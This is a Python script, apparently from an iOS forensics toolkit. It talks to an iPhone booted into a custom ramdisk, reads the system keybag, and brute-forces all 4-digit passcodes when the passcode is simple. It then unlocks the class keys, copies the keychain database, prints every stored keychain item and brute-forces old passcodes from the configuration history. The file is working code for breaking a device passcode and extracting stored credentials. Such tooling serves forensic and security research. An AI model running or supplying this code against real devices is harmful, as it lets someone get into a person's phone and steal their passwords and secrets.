import plistlib
import os
from keystore.keybag import Keybag
from keychain.keychain4 import Keychain4
from keychain.managedconfiguration import bruteforce_old_pass
from util.ramdiskclient import RamdiskToolClient
from util import write_file

def checkPasscodeComplexity(rdclient):
    pl = rdclient.downloadFile("/mnt2/mobile/Library/ConfigurationProfiles/UserSettings.plist")
    if not pl:
        print "Failed to download UserSettings.plist, assuming simple passcode"
        return 0
    pl = plistlib.readPlistFromString(pl)
    print "passcodeKeyboardComplexity :", pl["restrictedValue"]["passcodeKeyboardComplexity"]
    return pl["restrictedValue"]["passcodeKeyboardComplexity"]["value"]

def bf_system():
    client = RamdiskToolClient()
    di = client.getDeviceInfos()    
    key835 = di.get("key835").decode("hex")
    
    systembag = client.getSystemKeyBag()
    kbkeys = systembag["KeyBagKeys"].data
    kb = Keybag.createWithDataSignBlob(kbkeys, key835)
    keybags = di.setdefault("keybags", {})
    kbuuid = kb.uuid.encode("hex")
    print "Keybag UUID :", kbuuid
    if True and keybags.has_key(kbuuid) and keybags[kbuuid].has_key("passcodeKey"):
        print "We've already seen this keybag"
        passcodeKey = keybags[kbuuid].get("passcodeKey").decode("hex")
        print kb.unlockWithPasscodeKey(passcodeKey)
        kb.printClassKeys()
    else:
        keybags[kbuuid] = {"KeyBagKeys": systembag["KeyBagKeys"]}
        di.save()
        if checkPasscodeComplexity(client) == 0:
            print "Trying all 4-digits passcodes..."
            bf = client.bruteforceKeyBag(systembag["KeyBagKeys"].data)
            if bf:
                keybags[kbuuid].update(bf)
            print bf
            print kb.unlockWithPasscodeKey(bf.get("passcodeKey").decode("hex"))
            kb.printClassKeys()
            di["classKeys"] = kb.getClearClassKeysDict()
            di.save()
        else:
            print "Complex passcode used !"
            return
        
    #keychain_blob =    client.downloadFile("/private/var/Keychains/keychain-2.db")
    keychain_blob = client.downloadFile("/mnt2/Keychains/keychain-2.db")
    if keychain_blob:
        write_file("keychain-2.db", keychain_blob)
        keychain = Keychain4("keychain-2.db", kb)
        keychain.print_all(False)
        mc = keychain.get_managed_configuration()
        print "Bruteforcing old passcodes"
        for h in mc["history"]:
            print bruteforce_old_pass(h)
        
bf_system()